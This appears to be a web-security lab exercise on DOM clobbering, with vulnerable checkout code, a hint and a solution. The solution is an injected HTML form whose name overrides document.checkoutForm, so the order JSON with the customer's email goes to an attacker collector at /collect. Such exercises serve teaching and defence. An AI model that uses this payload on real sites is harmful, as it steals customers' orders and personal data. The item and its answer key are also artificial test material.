Checkout hijack

The checkout page looks up its form through document.checkoutForm and submits the order to form.action. If that lookup fails it falls back to a plain object. Reroute the order — including the customer's email and order reference — to /collect.

Victim code

const order = {
  ref: REF, item: 'Aperture TS-100',
  total: 42.00, coupon: 'SAVE10',
  account: 'alice@example.com'
};

const form = document.checkoutForm
          || { action: '/api/checkout' };

fetch(form.action, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify(order)
});

document exposes named properties too. Forms expose their action as a resolved absolute URL — an attacker only has to supply the element.

Your HTML injection

Hint

document.checkoutForm is a named property lookup. A <form name="checkoutForm"> satisfies it, and its action attribute is returned as a fully resolved URL. You don't need any JavaScript — a form is enough.

Solution 
<form name="checkoutForm" action="/collect"></form>

form.action resolves to http://127.0.0.1:8000/collect, so the order JSON is POSTed straight to the attacker collector.
